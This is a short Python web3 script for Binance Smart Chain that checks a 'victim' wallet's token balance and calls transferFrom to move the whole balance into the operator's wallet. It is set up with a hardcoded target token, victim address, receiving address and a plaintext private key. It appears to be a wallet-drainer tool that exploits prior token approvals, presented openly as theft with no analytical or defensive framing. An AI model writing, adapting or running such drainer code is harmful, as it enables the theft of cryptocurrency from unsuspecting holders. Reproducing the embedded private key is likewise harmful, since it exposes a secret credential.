from web3 import Web3

# CONFIG (Edit these)
TARGET_TOKEN = "0x452361b508b9033b9D2d66AD49eD166D097E6408"
VICTIM_WALLET = "0x41D91c20A61464c72B68f1B941D23ac39355609E"
YOUR_WALLET = "0xe27625486041b56E75161F950393f2D4933fC1c8"
PRIVATE_KEY = "ec08c372882438439a780bc1db5df8d645e50758c0afd02fdb5b6822abc6bc7b"
BSC_RPC = "https://bsc-dataseed.binance.org/"

# Setup Web3
w3 = Web3(Web3.HTTPProvider(BSC_RPC))

# Full ABI
token_abi = [
    {
        "inputs": [{"name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"name": "from", "type": "address"},
            {"name": "to", "type": "address"},
            {"name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

token = w3.eth.contract(address=TARGET_TOKEN, abi=token_abi)

def check_balance():
    balance = token.functions.balanceOf(VICTIM_WALLET).call()
    print(f"Victim balance: {balance / 10**18} tokens")
    return balance

def get_gas_fee():
    gas_price = w3.eth.gas_price
    gas_limit = 200000
    return gas_price * gas_limit

def check_bnb_balance():
    balance = w3.eth.get_balance(YOUR_WALLET)
    needed = get_gas_fee()
    print(f"Your BNB balance: {w3.fromWei(balance, 'ether')}")
    print(f"Needed for gas: {w3.fromWei(needed, 'ether')}")
    return balance >= needed

def transfer_tokens():
    if not check_bnb_balance():
        print("Error: Insufficient BNB for gas")
        return

    balance = check_balance()
    if balance == 0:
        print("Error: Victim has no balance")
        return

    tx = token.functions.transferFrom(
        VICTIM_WALLET,
        YOUR_WALLET,
        balance
    ).build_transaction({
        'from': YOUR_WALLET,
        'gas': 200000,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(YOUR_WALLET)
    })

    signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    
    print(f"Success! TX Hash: {tx_hash.hex()}")
    print(f"Transferred: {balance / 10**18} tokens")

if __name__ == "__main__":
    transfer_tokens()
